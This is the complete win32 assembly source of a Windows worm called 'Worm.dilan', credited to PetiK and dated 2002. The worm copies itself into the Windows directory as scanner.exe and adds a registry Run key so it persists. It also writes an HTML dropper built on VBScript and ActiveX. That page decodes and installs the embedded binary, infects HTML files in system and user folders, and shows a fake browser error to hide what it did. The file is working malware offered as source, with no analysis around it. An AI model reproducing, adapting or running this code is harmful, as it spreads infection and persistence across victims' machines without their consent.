; comment *
; Name : Worm.dilan aka adlin aka linda
; Author : PetiK
; Date : June 26th 2002
;
; Language : win32asm
; *

.586p
.model flat
.code

JUMPS

include useful.inc
include win32api.inc

api macro a
    extrn a:proc
    call a
endm

start:  pushad
    @SEH_SetupFrame     <jmp end_worm>


get_name:
    push    50
    mov esi,offset orgwrm
    push    esi
    push    0
    api GetModuleFileNameA

get_copy_name:
    mov edi,offset cpywrm
    push    edi
    push    50
    push    edi
    api GetWindowsDirectoryA
    add edi,eax
    mov eax,'acs\'
    stosd
    mov eax,'renn'
    stosd
    mov eax,'exe.'
    stosd
    pop edi

copy_worm:
    push    0
    push    edi
    push    esi
    api CopyFileA

    push    50
    push    edi
    push    1
    @pushsz "ScanW32"
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push    80000002h
    api SHSetValueA


    push    0
    push    0
    push    3
    push    0
    push    1
    push    80000000h
    push    offset cpywrm
    api CreateFileA
    inc eax
    je  end_worm
    dec eax
    xchg    ebx,eax

    push    0
    push    0
    push    0
    push    2
    push    0
    push    ebx
    api CreateFileMappingA
    test    eax,eax
    je  end_w1
    xchg    eax,ebp

    push    0
    push    0
    push    0
    push    4
    push    ebp
    api MapViewOfFile
    test    eax,eax
    je  end_w2
    xchg    eax,esi

    push    0
    push    ebx
    api GetFileSize
    mov [size],eax

scan_mail:
    xor edx,edx
    mov edi,offset hex_f
    push    edi
    p_c:    lodsb
        call    conv_hex
        stosw
    car_s:  dec size
        cmp size,0
        jne p_c
    entr1:  xor al,al
        stosb
        pop edi
    f_mail:
end_w3: push    esi
    api UnmapViewOfFile
end_w2: push    ebp
    api CloseHandle
end_w1: push    ebx
    api CloseHandle

    push    0
    push    5
    push    offset mydoc
    push    0
    api SHGetSpecialFolderPathA
    @pushsz "\dilan.htm"
    push    offset mydoc
    api lstrcat
    push    0
    push    80h
    push    2
    push    0
    push    1
    push    40000000h
    push    offset mydoc
    api CreateFileA
    mov [hhtm],eax
    push    0
    push    offset byte
    push    e_htm - s_htm
    push    offset s_htm
    push    [hhtm]
    api WriteFile
    push    [hhtm]
    api CloseHandle


end_worm:
    @SEH_RemoveFrame
    popad
    push    0
    api ExitProcess

conv_hex:
    PUSH ECX
    PUSH EDI

    XOR ECX, ECX
    MOV CL, AL
    PUSH ECX
    SHR CL, 04h
    LEA EDI, Tab_Hex
    INC CL

    @@Y:
    INC EDI
    DEC CL
    JNZ @@Y

    DEC EDI
    MOV AL, BYTE PTR [EDI]
    POP ECX
    AND CL, 0Fh
    LEA EDI, Tab_Hex
    INC CL

    @@X:
    INC EDI
    DEC CL
    JNZ @@X

    DEC EDI
    MOV AH, BYTE PTR [EDI]
    POP EDI
    POP ECX

    RET



.data
orgwrm  db 50 dup (0)
cpywrm  db 50 dup (0)
mydoc   db 70 dup (0)
hhtm    dd ?
byte    dd 0
size    dd ?
Tab_Hex db      "0123456789ABCDEF", 00h

s_htm:  db '<dilan>',CRLF
    db '<html><head><title>Only For You!</title></head><body>',CRLF
    db '<script language=vbscript>',CRLF
    db 'On Error Resume Next',CRLF
    db 'Set fso=createobject("scripting.filesystemobject")',CRLF
    db 'Set ws=createobject("wscript.shell")',CRLF
    db 'If err.number=429 then',CRLF
    db 'document.write "<font face size=''4'' color=black>You need ActiveX enabled to see this file<br>'
    db '<a href=''javascript:location.reload()''>Click Here</a> to reload and CLICK YES</font>"',CRLF
    db 'Else',CRLF
    db 'asmhex="'
hex_f   db 1024 * 13 dup (0)
    db '"',CRLF
    db 'read = dec(asmhex)',CRLF
    db 'Set r = fso.CreateTextFile(fso.GetSpecialFolder(0)&"\scanner.exe", 2)',CRLF
    db 'r.Write read',CRLF
    db 'r.Close',CRLF
    db 'ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanW32",fso.GetSpecialFolder(0)&"\scanner.exe"',CRLF,CRLF
    db 'infect(fso.GetSpecialFolder(0))',CRLF
    db 'infect(fso.GetSpecialFolder(1))',CRLF
    db 'infect(fso.GetSpecialFolder(2))',CRLF
    db 'infect(ws.SpecialFolders("MyDocuments"))',CRLF
    db 'infect(ws.SpecialFolders("Desktop"))',CRLF,CRLF
    db 'MsgBox "Sorry but your browser can''t read this Web file."',CRLF
    db 'End If',CRLF,CRLF
    db 'Function infect(dir)',CRLF
    db 'If fso.FolderExists(dir) Then',CRLF
    db 'For each cible in fso.GetFolder(dir).Files',CRLF
    db 'ext=lcase(fso.GetExtensionName(cible.Name))',CRLF
    db 'If ext="htm" or ext="html" Then',CRLF
    db 'Set gd=fso.OpenTextFile(cible.path,1)',CRLF
    db 'If gd.readline <> "<dilan>" Then',CRLF
    db 'htmorg=gd.Readall',CRLF
    db 'gd.Close',CRLF
    db 'Set gd=fso.OpenTextFile(cible.path,2)',CRLF
    db 'gd.WriteLine "<dilan>"',CRLF
    db 'gd.Write(htmorg)',CRLF
    db 'gd.WriteLine document.body.createtextrange.htmltext',CRLF
    db 'gd.Close',CRLF
    db 'Else',CRLF
    db 'gd.Close',CRLF
    db 'End If',CRLF
    db 'End If',CRLF
    db 'Next',CRLF
    db 'End If',CRLF
    db 'End Function',CRLF,CRLF
    db 'Function dec(octe)',CRLF
    db 'On Error Resume Next',CRLF
    db 'For hexad = 1 To Len(octe) Step 2',CRLF
    db 'dec = dec & Chr("&h" & Mid(octe, hexad, 2))',CRLF
    db 'Next',CRLF
        db 'End Function',CRLF
    db '</script></body></html>',CRLF
e_htm:


ends
end start
